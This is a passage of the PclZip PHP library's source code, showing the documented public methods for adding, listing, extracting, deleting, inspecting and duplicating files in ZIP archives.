          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Ignore an empty filename");
        }
      }
    }
    
    // ----- For each file in the list check the attributes
    $v_supported_attributes
    = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
             ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
             ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
             ,PCLZIP_ATT_FILE_MTIME => 'optional'
             ,PCLZIP_ATT_FILE_CONTENT => 'optional'
             ,PCLZIP_ATT_FILE_COMMENT => 'optional'
                                                );
    foreach ($v_att_list as $v_entry) {
      $v_result = $this->privFileDescrParseAtt($v_entry,
                                               $v_filedescr_list[],
                                               $v_options,
                                               $v_supported_attributes);
      if ($v_result != 1) {
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
        return 0;
      }
    }

    // ----- Expand the filelist (expand directories)
    $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
    if ($v_result != 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }

    // ----- Call the create fct
    $v_result = $this->privCreate($v_filedescr_list, $p_result_list, $v_options);
    if ($v_result != 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_result_list);
    return $p_result_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function :
  //   add($p_filelist, $p_add_dir="", $p_remove_dir="")
  //   add($p_filelist, $p_option, $p_option_value, ...)
  // Description :
  //   This method supports two synopsis. The first one is historical.
  //   This methods add the list of files in an existing archive.
  //   If a file with the same name already exists, it is added at the end of the
  //   archive, the first one is still present.
  //   If the archive does not exist, it is created.
  // Parameters :
  //   $p_filelist : An array containing file or directory names, or
  //                 a string containing one filename or one directory name, or
  //                 a string containing a list of filenames and/or directory
  //                 names separated by spaces.
  //   $p_add_dir : A path to add before the real path of the archived file,
  //                in order to have it memorized in the archive.
  //   $p_remove_dir : A path to remove from the real path of the file to archive,
  //                   in order to have a shorter path memorized in the archive.
  //                   When $p_add_dir and $p_remove_dir are set, $p_remove_dir
  //                   is removed first, before $p_add_dir is added.
  // Options :
  //   PCLZIP_OPT_ADD_PATH :
  //   PCLZIP_OPT_REMOVE_PATH :
  //   PCLZIP_OPT_REMOVE_ALL_PATH :
  //   PCLZIP_OPT_COMMENT :
  //   PCLZIP_OPT_ADD_COMMENT :
  //   PCLZIP_OPT_PREPEND_COMMENT :
  //   PCLZIP_CB_PRE_ADD :
  //   PCLZIP_CB_POST_ADD :
  // Return Values :
  //   0 on failure,
  //   The list of the added files, with a status of the add action.
  //   (see PclZip::listContent() for list entry format)
  // --------------------------------------------------------------------------------
  function add($p_filelist)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::add', "filelist='$p_filelist', ...");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Set default values
    $v_options = array();
    $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

    // ----- Look for variable options arguments
    $v_size = func_num_args();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "$v_size arguments passed to the method");

    // ----- Look for arguments
    if ($v_size > 1) {
      // ----- Get the arguments
      $v_arg_list = func_get_args();

      // ----- Remove form the options list the first argument
      array_shift($v_arg_list);
      $v_size--;

      // ----- Look for first arg
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Variable list of options detected");

        // ----- Parse the options
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_ADD => 'optional',
                                                   PCLZIP_CB_POST_ADD => 'optional',
                                                   PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                   PCLZIP_OPT_COMMENT => 'optional',
                                                   PCLZIP_OPT_ADD_COMMENT => 'optional',
                                                   PCLZIP_OPT_PREPEND_COMMENT => 'optional'
                                                   //, PCLZIP_OPT_CRYPT => 'optional'
                                                                                                   ));
        if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
          return 0;
        }
      }

      // ----- Look for 2 args
      // Here we need to support the first historic synopsis of the
      // method.
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Static synopsis");

        // ----- Get the first argument
        $v_options[PCLZIP_OPT_ADD_PATH] = $v_add_path = $v_arg_list[0];

        // ----- Look for the optional second argument
        if ($v_size == 2) {
          $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
        }
        else if ($v_size > 2) {
          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return 0;
        }
      }
    }

    // ----- Init
    $v_string_list = array();
    $v_att_list = array();
    $v_filedescr_list = array();
    $p_result_list = array();
    
    // ----- Look if the $p_filelist is really an array
    if (is_array($p_filelist)) {
    
      // ----- Look if the first element is also an array
      //       This will mean that this is a file description entry
      if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
        $v_att_list = $p_filelist;
      }
      
      // ----- The list is a list of string names
      else {
        $v_string_list = $p_filelist;
      }
    }

    // ----- Look if the $p_filelist is a string
    else if (is_string($p_filelist)) {
      // ----- Create a list from the string
      $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
    }

    // ----- Invalid variable type for $p_filelist
    else {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type '".gettype($p_filelist)."' for p_filelist");
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }
    
    // ----- Reformat the string list
    if (sizeof($v_string_list) != 0) {
      foreach ($v_string_list as $v_string) {
        $v_att_list[][PCLZIP_ATT_FILE_NAME] = $v_string;
      }
    }
    
    // ----- For each file in the list check the attributes
    $v_supported_attributes
    = array ( PCLZIP_ATT_FILE_NAME => 'mandatory'
             ,PCLZIP_ATT_FILE_NEW_SHORT_NAME => 'optional'
             ,PCLZIP_ATT_FILE_NEW_FULL_NAME => 'optional'
             ,PCLZIP_ATT_FILE_MTIME => 'optional'
             ,PCLZIP_ATT_FILE_CONTENT => 'optional'
             ,PCLZIP_ATT_FILE_COMMENT => 'optional'
                                                );
    foreach ($v_att_list as $v_entry) {
      $v_result = $this->privFileDescrParseAtt($v_entry,
                                               $v_filedescr_list[],
                                               $v_options,
                                               $v_supported_attributes);
      if ($v_result != 1) {
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
        return 0;
      }
    }

    // ----- Expand the filelist (expand directories)
    $v_result = $this->privFileDescrExpand($v_filedescr_list, $v_options);
    if ($v_result != 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }

    // ----- Call the create fct
    $v_result = $this->privAdd($v_filedescr_list, $p_result_list, $v_options);
    if ($v_result != 1) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return 0;
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_result_list);
    return $p_result_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : listContent()
  // Description :
  //   This public method, gives the list of the files and directories, with their
  //   properties.
  //   The properties of each entries in the list are (used also in other functions) :
  //     filename : Name of the file. For a create or add action it is the filename
  //                given by the user. For an extract function it is the filename
  //                of the extracted file.
  //     stored_filename : Name of the file / directory stored in the archive.
  //     size : Size of the stored file.
  //     compressed_size : Size of the file's data compressed in the archive
  //                       (without the headers overhead)
  //     mtime : Last known modification date of the file (UNIX timestamp)
  //     comment : Comment associated with the file
  //     folder : true | false
  //     index : index of the file in the archive
  //     status : status of the action (depending of the action) :
  //              Values are :
  //                ok : OK !
  //                filtered : the file / dir is not extracted (filtered by user)
  //                already_a_directory : the file can not be extracted because a
  //                                      directory with the same name already exists
  //                write_protected : the file can not be extracted because a file
  //                                  with the same name already exists and is
  //                                  write protected
  //                newer_exist : the file was not extracted because a newer file exists
  //                path_creation_fail : the file is not extracted because the folder
  //                                     does not exists and can not be created
  //                write_error : the file was not extracted because there was a
  //                              error while writing the file
  //                read_error : the file was not extracted because there was a error
  //                             while reading the file
  //                invalid_header : the file was not extracted because of an archive
  //                                 format error (bad file header)
  //   Note that each time a method can continue operating when there
  //   is an action error on a file, the error is only logged in the file status.
  // Return Values :
  //   0 on an unrecoverable failure,
  //   The list of the files in the archive.
  // --------------------------------------------------------------------------------
  function listContent()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::listContent', "");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Call the extracting fct
    $p_list = array();
    if (($v_result = $this->privList($p_list)) != 1)
    {
      unset($p_list);
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0, PclZip::errorInfo());
      return(0);
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_list);
    return $p_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function :
  //   extract($p_path="./", $p_remove_path="")
  //   extract([$p_option, $p_option_value, ...])
  // Description :
  //   This method supports two synopsis. The first one is historical.
  //   This method extract all the files / directories from the archive to the
  //   folder indicated in $p_path.
  //   If you want to ignore the 'root' part of path of the memorized files
  //   you can indicate this in the optional $p_remove_path parameter.
  //   By default, if a newer file with the same name already exists, the
  //   file is not extracted.
  //
  //   If both PCLZIP_OPT_PATH and PCLZIP_OPT_ADD_PATH aoptions
  //   are used, the path indicated in PCLZIP_OPT_ADD_PATH is append
  //   at the end of the path value of PCLZIP_OPT_PATH.
  // Parameters :
  //   $p_path : Path where the files and directories are to be extracted
  //   $p_remove_path : First part ('root' part) of the memorized path
  //                    (if any similar) to remove while extracting.
  // Options :
  //   PCLZIP_OPT_PATH :
  //   PCLZIP_OPT_ADD_PATH :
  //   PCLZIP_OPT_REMOVE_PATH :
  //   PCLZIP_OPT_REMOVE_ALL_PATH :
  //   PCLZIP_CB_PRE_EXTRACT :
  //   PCLZIP_CB_POST_EXTRACT :
  // Return Values :
  //   0 or a negative value on failure,
  //   The list of the extracted files, with a status of the action.
  //   (see PclZip::listContent() for list entry format)
  // --------------------------------------------------------------------------------
  function extract()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::extract", "");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Set default values
    $v_options = array();
//    $v_path = "./";
    $v_path = '';
    $v_remove_path = "";
    $v_remove_all_path = false;

    // ----- Look for variable options arguments
    $v_size = func_num_args();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "$v_size arguments passed to the method");

    // ----- Default values for option
    $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

    // ----- Look for arguments
    if ($v_size > 0) {
      // ----- Get the arguments
      $v_arg_list = func_get_args();

      // ----- Look for first arg
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Variable list of options");

        // ----- Parse the options
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                   PCLZIP_CB_POST_EXTRACT => 'optional',
                                                   PCLZIP_OPT_SET_CHMOD => 'optional',
                                                   PCLZIP_OPT_BY_NAME => 'optional',
                                                   PCLZIP_OPT_BY_EREG => 'optional',
                                                   PCLZIP_OPT_BY_PREG => 'optional',
                                                   PCLZIP_OPT_BY_INDEX => 'optional',
                                                   PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                   PCLZIP_OPT_EXTRACT_IN_OUTPUT => 'optional',
                                                   PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                   ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                   ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional'
                                                                                                    ));
        if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
          return 0;
        }

        // ----- Set the arguments
        if (isset($v_options[PCLZIP_OPT_PATH])) {
          $v_path = $v_options[PCLZIP_OPT_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
          $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
          $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
          // ----- Check for '/' in last path char
          if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
            $v_path .= '/';
          }
          $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
        }
      }

      // ----- Look for 2 args
      // Here we need to support the first historic synopsis of the
      // method.
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Static synopsis");

        // ----- Get the first argument
        $v_path = $v_arg_list[0];

        // ----- Look for the optional second argument
        if ($v_size == 2) {
          $v_remove_path = $v_arg_list[1];
        }
        else if ($v_size > 2) {
          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0, PclZip::errorInfo());
          return 0;
        }
      }
    }

    // ----- Trace
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "path='$v_path', remove_path='$v_remove_path', remove_all_path='".($v_remove_path?'true':'false')."'");

    // ----- Call the extracting fct
    $p_list = array();
    $v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path,
                                             $v_remove_all_path, $v_options);
    if ($v_result < 1) {
      unset($p_list);
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0, PclZip::errorInfo());
      return(0);
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_list);
    return $p_list;
  }
  // --------------------------------------------------------------------------------


  // --------------------------------------------------------------------------------
  // Function :
  //   extractByIndex($p_index, $p_path="./", $p_remove_path="")
  //   extractByIndex($p_index, [$p_option, $p_option_value, ...])
  // Description :
  //   This method supports two synopsis. The first one is historical.
  //   This method is doing a partial extract of the archive.
  //   The extracted files or folders are identified by their index in the
  //   archive (from 0 to n).
  //   Note that if the index identify a folder, only the folder entry is
  //   extracted, not all the files included in the archive.
  // Parameters :
  //   $p_index : A single index (integer) or a string of indexes of files to
  //              extract. The form of the string is "0,4-6,8-12" with only numbers
  //              and '-' for range or ',' to separate ranges. No spaces or ';'
  //              are allowed.
  //   $p_path : Path where the files and directories are to be extracted
  //   $p_remove_path : First part ('root' part) of the memorized path
  //                    (if any similar) to remove while extracting.
  // Options :
  //   PCLZIP_OPT_PATH :
  //   PCLZIP_OPT_ADD_PATH :
  //   PCLZIP_OPT_REMOVE_PATH :
  //   PCLZIP_OPT_REMOVE_ALL_PATH :
  //   PCLZIP_OPT_EXTRACT_AS_STRING : The files are extracted as strings and
  //     not as files.
  //     The resulting content is in a new field 'content' in the file
  //     structure.
  //     This option must be used alone (any other options are ignored).
  //   PCLZIP_CB_PRE_EXTRACT :
  //   PCLZIP_CB_POST_EXTRACT :
  // Return Values :
  //   0 on failure,
  //   The list of the extracted files, with a status of the action.
  //   (see PclZip::listContent() for list entry format)
  // --------------------------------------------------------------------------------
  //function extractByIndex($p_index, options...)
  function extractByIndex($p_index)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::extractByIndex", "index='$p_index', ...");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Set default values
    $v_options = array();
//    $v_path = "./";
    $v_path = '';
    $v_remove_path = "";
    $v_remove_all_path = false;

    // ----- Look for variable options arguments
    $v_size = func_num_args();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "$v_size arguments passed to the method");

    // ----- Default values for option
    $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;

    // ----- Look for arguments
    if ($v_size > 1) {
      // ----- Get the arguments
      $v_arg_list = func_get_args();

      // ----- Remove form the options list the first argument
      array_shift($v_arg_list);
      $v_size--;

      // ----- Look for first arg
      if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Variable list of options");

        // ----- Parse the options
        $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                            array (PCLZIP_OPT_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                   PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                   PCLZIP_OPT_EXTRACT_AS_STRING => 'optional',
                                                   PCLZIP_OPT_ADD_PATH => 'optional',
                                                   PCLZIP_CB_PRE_EXTRACT => 'optional',
                                                   PCLZIP_CB_POST_EXTRACT => 'optional',
                                                   PCLZIP_OPT_SET_CHMOD => 'optional',
                                                   PCLZIP_OPT_REPLACE_NEWER => 'optional'
                                                   ,PCLZIP_OPT_STOP_ON_ERROR => 'optional'
                                                   ,PCLZIP_OPT_EXTRACT_DIR_RESTRICTION => 'optional'
                                                                                                   ));
        if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
          return 0;
        }

        // ----- Set the arguments
        if (isset($v_options[PCLZIP_OPT_PATH])) {
          $v_path = $v_options[PCLZIP_OPT_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_REMOVE_PATH])) {
          $v_remove_path = $v_options[PCLZIP_OPT_REMOVE_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_REMOVE_ALL_PATH])) {
          $v_remove_all_path = $v_options[PCLZIP_OPT_REMOVE_ALL_PATH];
        }
        if (isset($v_options[PCLZIP_OPT_ADD_PATH])) {
          // ----- Check for '/' in last path char
          if ((strlen($v_path) > 0) && (substr($v_path, -1) != '/')) {
            $v_path .= '/';
          }
          $v_path .= $v_options[PCLZIP_OPT_ADD_PATH];
        }
        if (!isset($v_options[PCLZIP_OPT_EXTRACT_AS_STRING])) {
          $v_options[PCLZIP_OPT_EXTRACT_AS_STRING] = FALSE;
          //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Option PCLZIP_OPT_EXTRACT_AS_STRING not set.");
        }
        else {
            //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "Option PCLZIP_OPT_EXTRACT_AS_STRING set.");
        }
      }

      // ----- Look for 2 args
      // Here we need to support the first historic synopsis of the
      // method.
      else {
        //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Static synopsis");

        // ----- Get the first argument
        $v_path = $v_arg_list[0];

        // ----- Look for the optional second argument
        if ($v_size == 2) {
          $v_remove_path = $v_arg_list[1];
        }
        else if ($v_size > 2) {
          // ----- Error log
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid number / type of arguments");

          // ----- Return
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), PclZip::errorInfo());
          return 0;
        }
      }
    }

    // ----- Trace
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "index='$p_index', path='$v_path', remove_path='$v_remove_path', remove_all_path='".($v_remove_path?'true':'false')."'");

    // ----- Trick
    // Here I want to reuse extractByRule(), so I need to parse the $p_index
    // with privParseOptions()
    $v_arg_trick = array (PCLZIP_OPT_BY_INDEX, $p_index);
    $v_options_trick = array();
    $v_result = $this->privParseOptions($v_arg_trick, sizeof($v_arg_trick), $v_options_trick,
                                        array (PCLZIP_OPT_BY_INDEX => 'optional' ));
    if ($v_result != 1) {
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
        return 0;
    }
    $v_options[PCLZIP_OPT_BY_INDEX] = $v_options_trick[PCLZIP_OPT_BY_INDEX];

    // ----- Call the extracting fct
    if (($v_result = $this->privExtractByRule($p_list, $v_path, $v_remove_path, $v_remove_all_path, $v_options)) < 1) {
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0, PclZip::errorInfo());
        return(0);
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_list);
    return $p_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function :
  //   delete([$p_option, $p_option_value, ...])
  // Description :
  //   This method removes files from the archive.
  //   If no parameters are given, then all the archive is emptied.
  // Parameters :
  //   None or optional arguments.
  // Options :
  //   PCLZIP_OPT_BY_INDEX :
  //   PCLZIP_OPT_BY_NAME :
  //   PCLZIP_OPT_BY_EREG : 
  //   PCLZIP_OPT_BY_PREG :
  // Return Values :
  //   0 on failure,
  //   The list of the files which are still present in the archive.
  //   (see PclZip::listContent() for list entry format)
  // --------------------------------------------------------------------------------
  function delete()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::delete", "");
    $v_result=1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Set default values
    $v_options = array();

    // ----- Look for variable options arguments
    $v_size = func_num_args();
    //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 4, "$v_size arguments passed to the method");

    // ----- Look for arguments
    if ($v_size > 0) {
      // ----- Get the arguments
      $v_arg_list = func_get_args();

      // ----- Parse the options
      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                        array (PCLZIP_OPT_BY_NAME => 'optional',
                                               PCLZIP_OPT_BY_EREG => 'optional',
                                               PCLZIP_OPT_BY_PREG => 'optional',
                                               PCLZIP_OPT_BY_INDEX => 'optional' ));
      if ($v_result != 1) {
          //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
          return 0;
      }
    }

    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Call the delete fct
    $v_list = array();
    if (($v_result = $this->privDeleteByRule($v_list, $v_options)) != 1) {
      $this->privSwapBackMagicQuotes();
      unset($v_list);
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0, PclZip::errorInfo());
      return(0);
    }

    // ----- Magic quotes trick
    $this->privSwapBackMagicQuotes();

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_list);
    return $v_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : deleteByIndex()
  // Description :
  //   ***** Deprecated *****
  //   delete(PCLZIP_OPT_BY_INDEX, $p_index) should be prefered.
  // --------------------------------------------------------------------------------
  function deleteByIndex($p_index)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::deleteByIndex", "index='$p_index'");
    
    $p_list = $this->delete(PCLZIP_OPT_BY_INDEX, $p_index);

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $p_list);
    return $p_list;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : properties()
  // Description :
  //   This method gives the properties of the archive.
  //   The properties are :
  //     nb : Number of files in the archive
  //     comment : Comment associated with the archive file
  //     status : not_exist, ok
  // Parameters :
  //   None
  // Return Values :
  //   0 on failure,
  //   An array with the archive properties.
  // --------------------------------------------------------------------------------
  function properties()
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::properties", "");

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Magic quotes trick
    $this->privDisableMagicQuotes();

    // ----- Check archive
    if (!$this->privCheckFormat()) {
      $this->privSwapBackMagicQuotes();
      //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
      return(0);
    }

    // ----- Default properties
    $v_prop = array();
    $v_prop['comment'] = '';
    $v_prop['nb'] = 0;
    $v_prop['status'] = 'not_exist';

    // ----- Look if file exists
    if (@is_file($this->zipname))
    {
      // ----- Open the zip file
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 3, "Open file in binary read mode");
      if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
      {
        $this->privSwapBackMagicQuotes();
        
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

        // ----- Return
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, PclZip::errorCode(), 0);
        return 0;
      }

      // ----- Read the central directory informations
      $v_central_dir = array();
      if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
      {
        $this->privSwapBackMagicQuotes();
        //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 0);
        return 0;
      }

      // ----- Close the zip file
      $this->privCloseFd();

      // ----- Set the user attributes
      $v_prop['comment'] = $v_central_dir['comment'];
      $v_prop['nb'] = $v_central_dir['entries'];
      $v_prop['status'] = 'ok';
    }

    // ----- Magic quotes trick
    $this->privSwapBackMagicQuotes();

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_prop);
    return $v_prop;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : duplicate()
  // Description :
  //   This method creates an archive by copying the content of an other one. If
  //   the archive already exist, it is replaced by the new one without any warning.
  // Parameters :
  //   $p_archive : The filename of a valid archive, or
  //                a valid PclZip object.
  // Return Values :
  //   1 on success.
  //   0 or a negative value on error (error code).
  // --------------------------------------------------------------------------------
  function duplicate($p_archive)
  {
    //--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, "PclZip::duplicate", "");
    $v_result = 1;

    // ----- Reset the error handler
    $this->privErrorReset();

    // ----- Look if the $p_archive is a PclZip object
    if ((is_object($p_archive)) && (get_class($p_archive) == 'pclzip'))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "The parameter is valid PclZip object '".$p_archive->zipname."'");

      // ----- Duplicate the archive
      $v_result = $this->privDuplicate($p_archive->zipname);
    }

    // ----- Look if the $p_archive is a string (so a filename)
    else if (is_string($p_archive))
    {
      //--(MAGIC-PclTrace)--//PclTraceFctMessage(__FILE__, __LINE__, 2, "The parameter is a filename '$p_archive'");

      // ----- Check that $p_archive is a valid zip file
      // TBC : Should also check the archive format
      if (!is_file($p_archive)) {
        // ----- Error log
        PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "No file with filename '".$p_archive."'");
        $v_result = PCLZIP_ERR_MISSING_FILE;
      }
      else {
        // ----- Duplicate the archive
        $v_result = $this->privDuplicate($p_archive);
      }
    }

    // ----- Invalid variable
    else
    {
      // ----- Error log
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid variable type p_archive_to_add");
      $v_result = PCLZIP_ERR_INVALID_PARAMETER;
    }

    // ----- Return
    //--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, $v_result);
    return $v_result;
  }
  // --------------------------------------------------------------------------------

  // --------------------------------------------------------------------------------
  // Function : merge()
  // Description :
  //   This method merge the $p_archive_to_add archive at the end of the current
  //   one ($this).
  //   If the archive ($this) does not exist, the merge becomes a duplicate.
  //   If the $p_archive_to_add archive does not exist, the merge is a success.
  // Parameters :
  //   $p_archive_to_add : It can be directly the filename of a valid zip archive,
  //                       or a PclZip object archive.
  // Return Values :
  //   1 on success,
  //   0 or negative values on error (see below).
  // --------------------------------------------------------------------------------
  function merge($p_archive_to_add)
  {
